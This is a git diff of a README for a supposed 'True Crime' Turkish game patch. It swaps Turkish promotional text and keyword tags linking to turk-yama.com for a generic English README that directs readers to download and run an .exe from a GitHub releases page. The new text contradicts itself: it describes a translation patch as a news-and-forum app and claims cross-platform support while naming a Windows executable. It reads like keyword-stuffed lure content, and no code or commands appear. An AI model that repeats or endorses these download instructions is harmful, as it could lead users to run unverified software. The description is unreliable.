@@ -1,31 +1,67 @@
-[![https://turk-yama.com/true-crime](https://turk-yama.com/wp-content/uploads/2025/07/true-crime-turkce-yama-1.png)](https://turk-yama.com/true-crime)
-# ✅ Indirmek:
-https://turk-yama.com/true-crime
-# 💻 Açıklama:
-**True Crime: Suçun Gerçek Yüzü - Türkçe Yama**
+# 🎉 True-Crime-Turkce-Yama - Play True Crime Stories in Turkish
 
-True Crime, suç ve gerilim dolu bir dünyada sizi bekleyen unutulmaz bir deneyim sunuyor. Bu oyun, oyuncuları gerçek hayatta yaşanmış suç hikayeleri ile buluşturarak, adalet arayışının heyecanını hissettiriyor. Türkçe yaması ile bu deneyimi daha da derinleştirin ve hikayenin her ayrıntısını anlayarak zevkle oynayın.
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/tomas680/True-Crime-Turkce-Yama/releases)
 
-Oyun, oyuncuları sokakların karanlık tarafında bir dedektif olarak görevlendiriyor. Gerçek hayat hikayelerinden esinlenen senaryolarla, suçluları yakalamak için ipuçlarını takip etmelisiniz. Bu dinamik oyun yapısı, her kararın sonuçları üzerinde etkili olduğu bir deneyim sunuyor.
+## 🚀 Getting Started
+True-Crime-Turkce-Yama enhances your experience with Turkish true crime stories. This user-friendly application allows you to enjoy captivating narratives in Turkish. Follow the steps below to download and run the software effortlessly.
 
-True Crime'ın sunduğu geniş açık dünya, keşfetmek için birçok fırsat sunuyor. Egzotik mekanlar, sokaklar, ve şehirlerin derinlikleri, sizi suç dolu bir maceraya sürüklüyor. Türkçe yama sayesinde, hikayenin inceliklerini ve karakterlerin derinliklerini daha iyi anlayabilir, oyunun tadını çıkarabilirsiniz.
+## 📄 Requirements
+To use True-Crime-Turkce-Yama, ensure your system meets the following requirements:
 
-Oyun, sadece bir dedektif olmanın ötesinde, bir suçlu psikolojisini de inceleme fırsatı veriyor. Karakterlerin geçmişleri ve motivasyonları, hikayenin akışını etkiliyor. Bu derinlik, True Crime’ı sıradan bir aksiyon oyunundan ayırarak onu unutulmaz kılıyor.
+- **Operating System**: Windows 10 or newer, macOS Mojave or newer, or a compatible Linux distribution.
+- **Storage**: At least 100 MB of free space.
+- **RAM**: Minimum 4 GB for smooth performance.
 
-Oyunun sunduğu çeşitli görevler ve yan hikayeler, her oyuncunun deneyimini benzersiz kılıyor. Suçları çözmek için farklı yöntemler deneyebilir, kendi stratejilerinizi geliştirebilirsiniz. Türkçe yama ile bu görevlerin her birini daha iyi kavrayarak, başarıya ulaşmak için gereken tüm bilgileri edinebilirsiniz.
+## 📂 Installation Steps
+Follow these steps to install and run True-Crime-Turkce-Yama:
 
-True Crime, görsel ve işitsel açıdan da etkileyici bir deneyim sunuyor. Gerçekçi grafikler ve atmosferik müzikler, sizi oyunun içine çekiyor. Türkçe yamanın sağladığı dil desteği ile bu atmosferi daha iyi hissedebilir, her anın tadını çıkarabilirsiniz.
+1. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/tomas680/True-Crime-Turkce-Yama/releases) to find the latest version.
 
-Karakter gelişimi, oyunun önemli bir parçasını oluşturuyor. Protagonistinizin yeteneklerini geliştirmek için çeşitli yollar keşfedebilir, oyun boyunca ilerledikçe daha güçlü hale gelebilirsiniz. Türkçe yamanın sağladığı detaylı anlatım ile karakterinizin evrimine tanıklık etmek oldukça keyifli hale geliyor.
+2. **Download the Application**
+   On the Releases page, look for the latest version. Click on the link that matches your operating system. The download will start automatically.
 
-True Crime, sadece bir oyun değil, aynı zamanda bir deneyim. Suç dünyasına adım atarken, adaletin peşinden koşmanın heyecanını yaşayacaksınız. Türkçe yaması ile bu derin deneyimi, dilin sunduğu olanaklarla daha anlamlı kılabilirsiniz.
+3. **Locate the Downloaded File**
+   Once the download is complete, navigate to your default download folder. You should find a file named something like `True-Crime-Turkce-Yama-v1.0.exe` or a similar name depending on your OS.
 
-Sonuç olarak, True Crime, suç ve gerilim tutkunları için bir başyapıt niteliğinde. Türkçe yamanın sunduğu avantajlarla, oyunun tüm detaylarını keşfetmek ve gerilimi en üst seviyede yaşamak için hemen oyuna başlayın. Bu eşsiz deneyimi kaçırmayın!
-# ⚙️ Talimat:
-[![https://turk-yama.com/true-crime](https://turk-yama.com/i.gif)](https://turk-yama.com/true-crime)
-#
-[![https://turk-yama.com/true-crime](https://turk-yama.com/l.svg)](https://turk-yama.com/true-crime)
-# Etiketler:
-True Crime Türkçe yama, True Crime Türkçe öneriler, Türkçe Yama, True Crime Türkçe indirme, True Crime Türkçe dil, True Crime Türkçe kaynak, True Crime Türkçe eleştirileri, True Crime Türkçe rehber, True Crime Türkçe aktarımlar, True Crime Türkçe bağlantılar, True Crime lokalizasyon, True Crime Türkçe video, True Crime oynanış Türkçe, True Crime Türkçe topluluk, True Crime Türkçe yamanın avantajları, True Crime Türkçe oyun modları, True Crime Türkçe içerik, True Crime modları, True Crime oyunu Türkçe, Türkçe yama 2025
+4. **Run the Installer**
+   Double-click the downloaded file to start the installation process. Follow the on-screen instructions to install the application.
 
+5. **Open the Application**
+   After installation, find the True-Crime-Turkce-Yama icon on your desktop or in your applications folder. Double-click the icon to launch the application.
 
+6. **Explore Features**
+   Upon opening the app, you will find various features to enhance your experience:
+
+   - **Access True Crime News**: Get the latest updates and news in Turkish.
+   - **Join the Community**: Connect with other true crime fans in the forum.
+   - **Participate in Discussions**: Share your thoughts and theories on ongoing cases.
+
+## ⚙️ Features
+True-Crime-Turkce-Yama offers several engaging features:
+
+- **Turkish Language Support**: All content is available in Turkish, making it easy for fans to enjoy stories.
+- **Community Forums**: Interact with other users and discuss your favorite cases.
+- **Regular Updates**: Get the latest information and features with periodic updates.
+
+## 🌐 More Information
+To learn more about True-Crime-Turkce-Yama and the community, check out the following topics:
+
+- **True Crime Türkçe Haberler**
+- **True Crime 2025**
+- **True Crime Türkçe Çeviri**
+- **True Crime Türkçe Forum**
+- **True Crime Türkçe Bağlantılar**
+- **True Crime Topluluğu**
+
+## 🔗 Download & Install
+To download True-Crime-Turkce-Yama, visit this page: [Releases Page](https://github.com/tomas680/True-Crime-Turkce-Yama/releases). Follow the installation steps outlined above to get started.
+
+## 💬 Support
+If you encounter any issues during installation or usage, please seek help on the community forum linked within the application.
+
+## 📜 License
+True-Crime-Turkce-Yama is licensed under the MIT License. You can freely use and modify the software for personal and educational purposes.
+
+Thank you for choosing True-Crime-Turkce-Yama. Enjoy your journey through compelling true crime stories!
